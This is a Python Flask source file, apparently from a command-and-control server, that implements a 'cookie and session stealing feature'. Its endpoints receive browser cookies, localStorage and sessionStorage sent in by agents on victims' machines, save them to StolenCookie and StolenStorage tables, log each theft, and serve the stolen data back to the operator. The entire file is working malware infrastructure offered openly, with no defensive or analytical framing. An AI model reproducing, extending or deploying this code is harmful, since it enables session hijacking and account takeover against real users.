"""
Cookie and session stealing feature
"""
from flask import Blueprint, request, jsonify
from models import db, Agent, StolenCookie, StolenStorage

cookie_stealer_bp = Blueprint('cookie_stealer', __name__)


@cookie_stealer_bp.route('/steal/cookies', methods=['POST'])
def steal_cookies():
    """
    Receive stolen cookies from agent
    
    Payload:
    {
        "agent_id": "abc123",
        "cookies": [
            {
                "domain": "example.com",
                "name": "session_id",
                "value": "abc123xyz",
                "path": "/",
                "expires": "...",
                "secure": true,
                "httpOnly": false,
                "sameSite": "Lax"
            }
        ]
    }
    """
    try:
        data = request.json
        agent_id = data.get('agent_id')
        cookies = data.get('cookies', [])
        
        if not agent_id:
            return jsonify({'error': 'No agent_id provided'}), 400
        
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if not agent:
            return jsonify({'error': 'Agent not found'}), 404
        
        count = 0
        for cookie_data in cookies:
            # Check if cookie already exists
            existing = StolenCookie.query.filter_by(
                agent_id=agent.id,
                domain=cookie_data.get('domain'),
                name=cookie_data.get('name')
            ).first()
            
            if existing:
                # Update existing cookie
                existing.value = cookie_data.get('value')
                existing.expires = cookie_data.get('expires')
                existing.secure = cookie_data.get('secure', False)
                existing.http_only = cookie_data.get('httpOnly', False)
                existing.same_site = cookie_data.get('sameSite')
            else:
                # Create new cookie record
                cookie = StolenCookie(
                    agent_id=agent.id,
                    domain=cookie_data.get('domain'),
                    name=cookie_data.get('name'),
                    value=cookie_data.get('value'),
                    path=cookie_data.get('path', '/'),
                    expires=cookie_data.get('expires'),
                    secure=cookie_data.get('secure', False),
                    http_only=cookie_data.get('httpOnly', False),
                    same_site=cookie_data.get('sameSite')
                )
                db.session.add(cookie)
            
            count += 1
        
        db.session.commit()
        
        print(f"[+] Stole {count} cookies from agent {agent_id}")
        for cookie_data in cookies[:5]:  # Show first 5
            print(f"    {cookie_data.get('domain')} - {cookie_data.get('name')}")
        
        return jsonify({
            'success': True,
            'count': count
        })
        
    except Exception as e:
        print(f"[-] Cookie theft error: {str(e)}")
        return jsonify({'error': str(e)}), 500


@cookie_stealer_bp.route('/steal/storage', methods=['POST'])
def steal_storage():
    """
    Receive stolen localStorage and sessionStorage
    
    Payload:
    {
        "agent_id": "abc123",
        "localStorage": {"key": "value", ...},
        "sessionStorage": {"key": "value", ...}
    }
    """
    try:
        data = request.json
        agent_id = data.get('agent_id')
        
        if not agent_id:
            return jsonify({'error': 'No agent_id provided'}), 400
        
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if not agent:
            return jsonify({'error': 'Agent not found'}), 404
        
        count = 0
        
        # Process localStorage
        local_storage = data.get('localStorage', {})
        for key, value in local_storage.items():
            existing = StolenStorage.query.filter_by(
                agent_id=agent.id,
                storage_type='localStorage',
                key=key
            ).first()
            
            if existing:
                existing.value = str(value)
            else:
                storage = StolenStorage(
                    agent_id=agent.id,
                    storage_type='localStorage',
                    domain=request.headers.get('Origin', 'unknown'),
                    key=key,
                    value=str(value)
                )
                db.session.add(storage)
            
            count += 1
        
        # Process sessionStorage
        session_storage = data.get('sessionStorage', {})
        for key, value in session_storage.items():
            existing = StolenStorage.query.filter_by(
                agent_id=agent.id,
                storage_type='sessionStorage',
                key=key
            ).first()
            
            if existing:
                existing.value = str(value)
            else:
                storage = StolenStorage(
                    agent_id=agent.id,
                    storage_type='sessionStorage',
                    domain=request.headers.get('Origin', 'unknown'),
                    key=key,
                    value=str(value)
                )
                db.session.add(storage)
            
            count += 1
        
        db.session.commit()
        
        print(f"[+] Stole {count} storage items from agent {agent_id}")
        
        return jsonify({
            'success': True,
            'count': count
        })
        
    except Exception as e:
        print(f"[-] Storage theft error: {str(e)}")
        return jsonify({'error': str(e)}), 500


@cookie_stealer_bp.route('/cookies/<int:agent_id>', methods=['GET'])
def get_agent_cookies(agent_id):
    """Get all stolen cookies for an agent"""
    cookies = StolenCookie.query.filter_by(agent_id=agent_id)\
        .order_by(StolenCookie.stolen_at.desc())\
        .all()
    
    return jsonify([cookie.to_dict() for cookie in cookies])


@cookie_stealer_bp.route('/storage/<int:agent_id>', methods=['GET'])
def get_agent_storage(agent_id):
    """Get all stolen storage for an agent"""
    storage = StolenStorage.query.filter_by(agent_id=agent_id)\
        .order_by(StolenStorage.stolen_at.desc())\
        .all()
    
    return jsonify([s.to_dict() for s in storage])
